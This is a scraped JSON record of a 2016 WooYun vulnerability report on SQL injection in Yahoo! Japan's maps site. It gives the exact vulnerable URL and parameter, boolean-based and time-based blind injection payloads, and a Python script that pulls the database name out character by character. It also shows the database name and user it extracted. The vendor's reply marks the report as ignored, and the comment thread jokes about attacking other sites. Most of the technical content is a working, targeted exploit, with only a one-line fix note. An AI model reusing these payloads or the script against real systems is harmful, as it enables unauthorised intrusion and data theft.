{"id": 74234, "wybug_id": "wooyun-2016-0176575", "wybug_title": "Yahoo! Japan Website Multiple SQL Injection Vulnerabilities #2", "wybug_corp": "Yahoo! Japan", "wybug_author": "猪猪侠", "wybug_date": "2016-02-17 22:43", "wybug_open_date": "2016-02-22 22:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(日本国家互联网应急中心(JPCERT/CC))处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://www.alexa.com/topsites/countries/JPTop Sites in Japan, No 1 Is yahoo.co.jp , Then Submit, One most 3 vulnerabilities;Yahoo! Japan Website Multiple SQL Injection Vulnerabilities #2Include: boolean-based blind, AND/OR time-based blind 详细说明：  #1 DescriptionVulnerable Website: http://maps.yahoo.co.jpInjection URL: http://maps.yahoo.co.jp/provider/api_world_category.php?output=xml&iso=&g2=&_i=1&g1=1#2 Vulnerability\nParameter: g1 (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: output=xml&iso=&g1=1 AND 4713=4713&g2=&_i=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: output=xml&iso=&g1=1 AND SLEEP(5)&g2=&_i=1\n   漏洞证明：  #3 Exploit\n#!/usr/bin/env python# encoding: utf-8# yahoo.jp.py# ringzero@**.**.**.**import requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,30):    for _str in payloads:        start_time = time.time()        url = \"http://maps.yahoo.co.jp/provider/api_world_category.php?output=xml&iso=&g2=&_i=1&g1=1 AND ASCII(MID(LOWER(DATABASE()),\" + str(i) + \",1))=\" + str(ord(_str))        result = requests.get(url).content        if len(result) > 300:            print _str            break\n#4 Proof of ConceptMaps database name is:\nymap_db\nDatabase User() is:\nmaps@fe264.map.ssk.ynwp.yahoo.co.jp\n   修复方案：  # before making any kind of request with them must be validated.   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-22 22:50 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-17 22:43 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3813 漏洞数:295        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  一个厂商最多提交3个，就酱紫    \n     2016-02-17 22:48 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1845 漏洞数:294        | 风暴网络安全空间：http://www.heysec.or...)\t\t \n  @猪猪侠 为啥最多3个？    \n     2016-02-17 22:49 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:8        | 只是路过)\t\t \n  666666    \n     2016-02-17 22:49 |    \t\tMyh4ck1ife \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 男.国内知名潜水党伸手党以及深夜党！精通C...)\t\t \n  可以可以    \n     2016-02-17 22:51 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3813 漏洞数:295        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @HackBraid 超过3个，就没啥意思了    \n     2016-02-17 22:53 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3813 漏洞数:295        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  http://www.alexa.com/topsites/countries/JP    \n     2016-02-17 22:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:21        | 当我又回首一切,这个世界会好吗?)\t\t \n  来个命令执行啊    \n     2016-02-17 23:39 |    \t\t来打我呀 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 欢脱跳跃的小鲜肉~)\t\t \n  所以猪哥下次真的要东京热了？    \n     2016-02-18 12:28 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:5        | 你猜)\t\t \n  3连击    \n     2016-02-18 16:30 |    \t\tphoenixne \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:44        | 小本毕业，向各位学习)\t\t \n  东京热 拉开序幕了？    \n     2016-02-18 23:21 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 以正和，以奇胜！)\t\t \n  @猪猪侠 强烈要求东京热    \n     2016-02-19 17:07 |    \t\ttangtanglove \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 一个对安全感兴趣的屌丝phper)\t\t \n  @猪猪侠 这英文高大上，虽然我不懂啥意思！求测试东京热网站    \n     2016-02-22 20:02 |    \t\t末影人 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:14        | 末影人(Enderman)是一个三个方格高的人形生...)\t\t \n  @疯狗 JPCERT好像不知道怎么确认漏洞啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}